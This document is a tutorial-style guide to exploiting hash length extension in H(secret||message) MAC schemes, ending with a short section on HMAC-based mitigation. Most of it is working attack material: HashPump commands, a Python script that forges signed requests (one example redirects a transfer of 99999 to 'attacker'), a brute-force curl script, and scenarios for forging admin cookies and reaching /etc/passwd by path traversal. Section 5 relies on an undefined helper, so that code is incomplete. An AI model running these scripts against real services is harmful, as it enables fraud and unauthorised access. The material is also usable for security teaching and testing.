# Hash Length Extension Attack Guide

> Exploit Merkle-Damgard hash constructions (MD5, SHA-1, SHA-256) to append data to a hashed message without knowing the secret key. This bypasses MAC schemes that use `H(secret || message)`.

## 1. Understanding the Vulnerability

Hash functions based on Merkle-Damgard construction (MD5, SHA-1, SHA-256, SHA-512) process data in blocks. Given `H(secret || message)` and the length of the secret, an attacker can compute `H(secret || message || padding || extension)` without knowing the secret.

**Vulnerable pattern:**
```python
# VULNERABLE: secret-prefix MAC
mac = sha256(secret + user_data).hexdigest()

# SECURE: use HMAC instead
mac = hmac.new(secret, user_data, hashlib.sha256).hexdigest()
```

**Not vulnerable:** HMAC, SHA-3 (Keccak), BLAKE2, truncated hashes.

## 2. Identifying Vulnerable Applications

Look for these indicators in web applications:

```bash
# Common vulnerable patterns in API signatures
# URL: /api/download?file=report.pdf&sig=a3f2b8c9...
# Cookie: data=user%3Dalice&mac=7e2f1a...

# Test: if the MAC is computed as H(secret || data), it's vulnerable
# Check if appending data with correct padding produces a valid MAC

# Identify hash algorithm from MAC length
# 32 hex chars = MD5
# 40 hex chars = SHA-1
# 64 hex chars = SHA-256
echo -n "a3f2b8c9d4e5f6a7b8c9d4e5f6a7b8c9" | wc -c
# 32 chars = MD5
```

## 3. Exploitation with HashPump

HashPump is the standard tool for length extension attacks:

```bash
# Install HashPump
git clone https://github.com/bwall/HashPump.git
cd HashPump && make && sudo make install

# Basic usage
hashpump -s <original_signature> \
         -d <original_data> \
         -a <data_to_append> \
         -k <secret_key_length>

# Example: extend a signed API request
hashpump -s "6d5f807e23db210bc254a28be2d6759a0f5f5d99" \
         -d "user=guest&role=viewer" \
         -a "&role=admin" \
         -k 16
# Output: new signature + new data (with padding bytes)
```

## 4. Python Exploitation Script

Automate the attack against a web application:

```python
import hashpumpy
import requests
import urllib.parse

def length_extension_attack(url, original_data, original_sig, append_data, key_lengths):
    """Try multiple key lengths to find the correct one."""
    for key_len in key_lengths:
        new_sig, new_data = hashpumpy.hashpump(
            original_sig,
            original_data,
            append_data,
            key_len
        )
        
        # URL-encode the new data (contains null bytes from padding)
        encoded_data = urllib.parse.quote(new_data, safe='=&')
        
        # Submit the forged request
        resp = requests.get(
            f"{url}?data={encoded_data}&sig={new_sig}"
        )
        
        if resp.status_code == 200:
            print(f"[+] Success with key_length={key_len}")
            print(f"    New signature: {new_sig}")
            print(f"    New data: {new_data}")
            return new_sig, new_data
    
    return None, None

# Brute-force key length (typically 8-32 bytes)
length_extension_attack(
    url="https://target.com/api/verify",
    original_data=b"amount=100&to=alice",
    original_sig="a1b2c3d4e5f6...",
    append_data=b"&amount=99999&to=attacker",
    key_lengths=range(8, 33)
)
```

## 5. Manual SHA-256 Extension

Understanding the internal state reconstruction:

```python
import struct
import hashlib

def sha256_extend(original_hash, original_data_len, secret_len, append):
    """Manually perform SHA-256 length extension."""
    # Reconstruct internal state from hash output
    state = struct.unpack('>8I', bytes.fromhex(original_hash))
    
    # Calculate total length including secret + data + padding
    total_original = secret_len + original_data_len
    # Padding: 0x80 + zeros + 8-byte big-endian bit length
    pad_len = (55 - total_original) % 64
    padded_len = total_original + 1 + pad_len + 8
    
    # The new message length for the final hash
    new_bit_len = (padded_len + len(append)) * 8
    
    # Continue hashing from the reconstructed state
    # (requires a modified SHA-256 that accepts initial state)
    return compute_from_state(state, append, new_bit_len)
```

## 6. Real-World Attack Scenarios

Common targets for length extension:

```bash
# Scenario 1: API request signing
# Original: GET /api/transfer?from=user&amount=10&sig=abc123
# Extended: GET /api/transfer?from=user&amount=10[padding]&amount=999999&sig=new_sig
# Last parameter wins in many frameworks

# Scenario 2: Signed cookies
# Original cookie: user=guest; sig=def456
# Extended: user=guest[padding]&admin=true; sig=new_sig

# Scenario 3: File integrity checks
# Original: H(secret || filename) used to authorize downloads
# Extended: append path traversal /../../../etc/passwd
```

## 7. Automated Detection Script

Detect vulnerable MAC implementations:

```bash
#!/bin/bash
# Test if a MAC endpoint is vulnerable to length extension
TARGET="$1"  # e.g., https://target.com/api/verify
DATA="$2"    # e.g., "user=test"
SIG="$3"     # e.g., "a1b2c3..."

echo "[*] Testing hash length extension vulnerability"
echo "[*] Original data: $DATA"
echo "[*] Original sig:  $SIG"

# Try key lengths 8-32
for klen in $(seq 8 32); do
  RESULT=$(hashpump -s "$SIG" -d "$DATA" -a "&extended=true" -k "$klen" 2>/dev/null)
  NEW_SIG=$(echo "$RESULT" | head -1)
  NEW_DATA=$(echo "$RESULT" | tail -1)
  
  # URL-encode and test
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$NEW_DATA'''))")
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET?data=$ENCODED&sig=$NEW_SIG")
  
  if [ "$STATUS" = "200" ]; then
    echo "[+] VULNERABLE! Key length: $klen"
    echo "    New sig: $NEW_SIG"
    exit 0
  fi
done
echo "[-] Not vulnerable or key length > 32"
```

## 8. Mitigation and Verification

Confirm proper MAC implementation:

```python
# SECURE: Always use HMAC, never H(secret || message)
import hmac
import hashlib

def create_mac(secret: bytes, message: bytes) -> str:
    """Create a proper HMAC that resists length extension."""
    return hmac.new(secret, message, hashlib.sha256).hexdigest()

def verify_mac(secret: bytes, message: bytes, provided_mac: str) -> bool:
    """Constant-time MAC verification."""
    expected = hmac.new(secret, message, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, provided_mac)
```

Key defenses: use HMAC (RFC 2104), SHA-3/BLAKE2 (not Merkle-Damgard), or encrypt-then-MAC constructions.
